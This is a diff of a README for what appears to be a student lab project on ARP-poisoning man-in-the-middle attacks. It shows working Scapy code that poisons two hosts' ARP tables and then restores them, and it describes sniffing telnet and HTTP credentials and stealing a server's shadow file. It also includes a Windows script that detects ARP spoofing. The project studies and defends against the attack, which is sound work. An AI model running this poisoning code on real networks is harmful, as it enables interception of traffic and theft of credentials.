@@ -117,9 +117,10 @@ is the address corresponding to:
 
 - The server IP for the client machine.
  
-Some useful functions in the program to perform this attack:
+Some useful functions in the scripts utils.py and mitm.py to perform this attack:
 
 ```python
+# broadcasting an ARP request packet on the private network to obtain the MAC address of the target
 def get_mac(IP, interface="eth0"):
     conf.verb = 0
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
@@ -128,18 +129,21 @@ def get_mac(IP, interface="eth0"):
 ``` 
 
 ```python
-def poison_arp(target1_mac, target2_mac):
-    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst=target1_mac))
-    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst=target2_mac))
+def poison_arp(target1_mac, ip1, target2_mac, ip2):
+    # tells each target that our machine has the IP of the other, resulting in an ARP table update on both machines
+    send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst=target1_mac))
+    send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst=target2_mac))
 ``` 
 
 ```python
-def undo_arp():
+def undo_arp(ip1, ip2):
     print("\n[*] Restoring Targets...")
-    target1_mac = get_mac(target1_ip)
-    target2_mac = get_mac(target2_ip)
-    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
-    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
+    target1_mac = get_mac(ip1)
+    target2_mac = get_mac(ip2)
+    # undo ARP tables tampering by broadcasting previous MAC values
+    send(ARP(op=2, pdst=ip2, psrc=ip1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
+    send(ARP(op=2, pdst=ip1, psrc=ip2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
+
     print("[*] Disabling IP Forwarding...")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     print("[*] Shutting Down...")
@@ -406,25 +410,23 @@ Here we can see the result of executing the http sniffing script (after executin
     Since Windows is the most used OS from the client side, we decided to make a defense system for this platform in particular, as a proof of concept:
     
 ```python
-import os
-import re
-import time
-
-from pip._vendor.distlib.compat import raw_input
-
-
 def check_arp_integrity(list):
+    # sending arp table based on a specific interface will check if each MAC address is registered only once
     if len(list) == len(set(list)):
         return False
     else:
         return True
 
 
+# this program is intended to work on windows
+# On UNIX systems the regex might be slightly different to parse MAC and IP addresses
 def anti_spoofing(iface="192.168.0.37"):
     print("Running anti-spoofing program on interface {}".format(iface))
     while 1:
         try:
             mac_add = []
+
+            # reads each line of ARP table (Windows only)
             with os.popen('arp -a -N {}'.format(iface)) as f:
                 data = f.read()
 
@@ -432,10 +434,14 @@ def anti_spoofing(iface="192.168.0.37"):
                 mac = line[1]
                 if mac != "ff-ff-ff-ff-ff-ff":
                     mac_add.append(line[1])
+
             arp_checking = check_arp_integrity(mac_add)
+
             if arp_checking:
                 print("ALERT !!")
                 break
+
+            # time between each call, a smaller value can detect the intrusion faster but uses more resources
             time.sleep(1.5)
 
         except KeyboardInterrupt:
@@ -462,7 +468,8 @@ But with time, we thought that it would make the attack a lot more suspicious on
 This is why we decided to use the library Scapy to help us on our project.
 However, we also decided to add a custom countermeasure part to our project's goal, with the ARP Poisoning detector script, which was really interesting to make.
 
-From the different tests that we realised, we are satisfied of our scripts which work as attended (as the pictures show).
+From the different tests that we realised, we are really satisfied of our scripts which work as attended (as the pictures show). Thanks to the MITM script, we spoof the IP of our victims and make all their traffic transit by our machine. In the case of telnet sniffing, we manage to fetch the credentials and use them to steal the content of the shadow file on the server.
+With the http sniffing, we also manage to fetch the credentials and are able to log into the client's account on the login page. Finally, the ARP Poisoning detector launches alerts when it detects that there is the same MAC address for multiple IPs in the local ARP table.
 
 With this project, we can note that perform a Man In The Middle attack can be very feasible for a determined attacker. Even more with nowdays tools like Ettercap, Driftnet, etc.
 Since this attack relies on the fact that you have to be already connected to the target network, it can be extremely difficult to realise in real case scenarios when it comes to 
